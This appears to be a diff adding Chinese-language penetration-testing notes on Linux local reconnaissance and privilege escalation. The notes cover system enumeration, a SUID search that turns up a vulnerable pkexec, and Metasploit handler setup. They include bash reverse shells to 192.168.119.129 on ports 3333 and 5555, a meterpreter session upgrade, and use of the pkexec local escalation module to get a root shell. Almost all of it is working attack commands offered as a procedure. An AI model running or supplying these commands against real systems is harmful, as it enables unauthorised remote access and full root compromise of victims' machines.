@@ -1,0 +1,52 @@
+Linux 本地信息收集与提权思路
+
+uname         显示系统名、节点名称、操作系统的发行版号、内核版本等等
+
+cat /etc/os-release      显示有关操作系统的详细信息，如发行版名称、版本号等
+
+id
+
+sudo -l      这个命令列出当前用户通过sudo命令能够执行的所有命令
+
+find / -perm -4000 2>/dev/null     查找可利用的suid程序
+/usr/bin/pkexec   找到的可利用的漏洞
+pkexec --version
+polkit 0.112
+
+MSF提权：
+use exploit/multi/handler
+set payload linux/x86/shell_reverse_tcp
+set LHOST 192.168.119.129
+set LPORT 3333
+run
+
+bash  -i >& /dev/tcp/192.168.119.129/3333 0>&1
+
+ctrl z之后
+
+sessions -l  
+y
+sessions -u 1
+
+sessions -i 2
+进入 meterpreter
+getuid
+
+background
+sessions -l
+sessions -i 2
+background
+
+加载 pkexec 本地提权模块
+show options
+设置参数：set SESSION 2
+set LHOST 192.168.119.129
+set LPORT 5555
+run
+runuser -u root -c 'bash -i >& /dev/tcp/192.168.119.129/5555 0>&1'
+
+
+
+
+
+
